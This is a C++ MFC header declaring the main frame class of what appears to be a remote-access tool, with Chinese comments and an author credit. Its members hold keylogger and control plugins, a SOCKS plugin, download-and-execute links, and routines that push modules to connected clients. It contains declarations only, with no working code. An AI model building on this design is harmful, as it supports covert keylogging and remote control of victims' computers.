// MainFrm.h : interface of the CMainFrame class
//
/////////////////////////////////////////////////////////////////////////////

#if !defined(AFX_MAINFRM_H__4920299B_DB96_403A_9D10_9315076E14A7__INCLUDED_)
#define AFX_MAINFRM_H__4920299B_DB96_403A_9D10_9315076E14A7__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "MyClientManaView.h"
#include "MyLogsView.h"
#include "MyTopView.h"
#include "MyBottomView.h"

/*
作者的QQ是4564405，网名无可非议，转载或者修改版本请打上作者的标记，也是对辛勤劳动的尊重；
*/

class CMainFrame : public CFrameWnd
{
	
DECLARE_DYNCREATE(CMainFrame)
public:

	CMainFrame();           // protected constructor used by dynamic creation
	~CMainFrame();

	// Attributes
public:

	//控制插件
	DWORD m_DllSize;
	LPBYTE pDllFileData;

	//键盘记录插件
	DWORD m_KeySize;
	LPBYTE pKeyFileData;

/*	//CMD.EXE
	DWORD m_CmdSize;
	LPBYTE pCmdFileData;
*/
	//SOCKS插件
	BYTE* pSckFileData;
	DWORD m_SckSize;

	//更新客户端文件
	DWORD nUpdateFileLen;
	BYTE* pUpdateFileData;

	//上传客户端文件
	DWORD nUpLoadFileLen;
	BYTE* pUpLoadFileData;

	//下载执行连接
	DWORD nLinkStrLen;
	BYTE* pLinkStrData;

	//用户显示信息
	DWORD nMessStrLen;
	BYTE* pMessStrData;

	//下载执行连接
	DWORD nDownUrlLen;
	BYTE* pDownUrlData;

	//全局互斥量
	HANDLE hLockFileMutex;
	BOOL	m_IsProxy;
	SOCKET	m_Socket;
	HANDLE	hExitEvent;

	DWORD nVolumeSerialNumber;

	virtual BOOL StartWork();

// Operations
public:

	BOOL GetSysFileData(LPCTSTR pFileName, BYTE** pFileDataBuf, DWORD* pFileDataLen, LPCTSTR pTitle);
	void SendLogs(LPCTSTR pText);
	void StartMainShowProcess();
	void StartFileDownProcess();
	BOOL FillMyGolbalValue();

	void static DoNormalListenThread(LPVOID lPvoid);
	void static DoProxyListenThread(LPVOID lPvoid);
		
	void static DoNormalChildWorkThread(LPVOID lPvoid);
	void static DoProxyChildWorkThread(LPVOID lPvoid);

	void DoChildWork(SOCKET s);
	SOCKET static StartTcp(WORD Port);
	SOCKET static GetConnectSocket(char* pServerAddr, UINT nServerPort);

	void DownLoadKeyFile(MyServerTran* pTran);
	void DownLoadModFile(MyServerTran* pTran);
	void DoWndTransWork(MyServerTran* pTran);
	void SendMainConnect(MyServerTran* pTran);
	void SendClientDown(MyServerTran* pTran);
	void SendDataToClient(MyServerTran* pTran, DWORD nSendDataLen, BYTE* pSendData);

	void DisEnableXvidShow();

// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CMainFrame)
	protected:

	//}}AFX_VIRTUAL

// Implementation
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

protected:  // control bar embedded members

	// Generated message map functions
protected:

	//{{AFX_MSG(CMainFrame)
	afx_msg BOOL OnCopyData(CWnd* pWnd, COPYDATASTRUCT* pCopyDataStruct);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_MAINFRM_H__4920299B_DB96_403A_9D10_9315076E14A7__INCLUDED_)
